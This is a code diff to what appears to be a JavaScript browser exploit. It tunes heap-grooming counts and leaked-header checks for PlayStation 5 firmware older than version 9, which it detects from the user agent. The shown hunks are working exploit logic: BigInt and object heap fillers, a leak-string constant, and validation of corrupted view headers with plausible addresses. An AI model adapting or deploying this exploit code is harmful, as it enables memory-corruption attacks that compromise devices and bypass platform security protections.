@@ -3,8 +3,6 @@ const AUTO_RETRY_DELAY_MS = 50;
 const DUPLICATE_INDEX = 2;
 const CONTROL_INDEX = 0xffff;
 const CONTROL_INT = -64000;
-const FILLER_BIGINTS = 1;
-const FILLER_OBJECTS = 0xfffc;
 const CLONED_ARRAY_LENGTH = 0x50001;
 const LEAK_STRING_LENGTH = 924176;
 
@@ -87,6 +85,15 @@ function allZero(bytes, start, end) {
     if (bytes[i] !== 0) return false;
   }
   return true;
+}
+
+function usesLegacyWebKit() {
+  return /PlayStation 5\/[0-8]\./.test(navigator.userAgent);
+}
+
+function fillerBigIntCount() {
+  if (!usesLegacyWebKit()) return 1;
+  return [2, 4, 6, 7][(attemptNumber - 1) % 4];
 }
 
 function uint32At(bytes, offset) {
@@ -347,9 +354,9 @@ function storeHistoryGraph() {
   const fillerGraph = new Array(0xfffd);
   let pos = 0;
   const huge = 1n << 40n;
-  for (let i = 0; i < FILLER_BIGINTS; i++)
+  for (let i = 0; i < fillerBigIntCount(); i++)
     fillerGraph[pos++] = huge + BigInt(i);
-  for (let i = 0; i < FILLER_OBJECTS; i++) fillerGraph[pos++] = {};
+  while (pos < fillerGraph.length) fillerGraph[pos++] = {};
 
   outerGraph = new Array(CONTROL_INDEX + 1);
   outerGraph[0] = fillerGraph;
@@ -440,6 +447,16 @@ function validStructure(header) {
   return id >= 0x100 && id < 0x08000000;
 }
 
+function validViewLayout() {
+  if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28);
+
+  return (
+    allZero(viewHeader, 0x1c, 0x20) &&
+    viewHeader[0x20] <= 3 &&
+    allZero(viewHeader, 0x21, 0x28)
+  );
+}
+
 function inspectViewHeader() {
   const vector = low48At(viewHeader, 0x10);
 
@@ -448,7 +465,7 @@ function inspectViewHeader() {
     !plausibleAddress(low48At(viewHeader, 0x08)) ||
     !plausibleAddress(vector) ||
     uint32At(viewHeader, 0x18) !== MEMORY_WINDOW_SIZE ||
-    !allZero(viewHeader, 0x20, 0x28)
+    !validViewLayout()
   )
     return null;
 
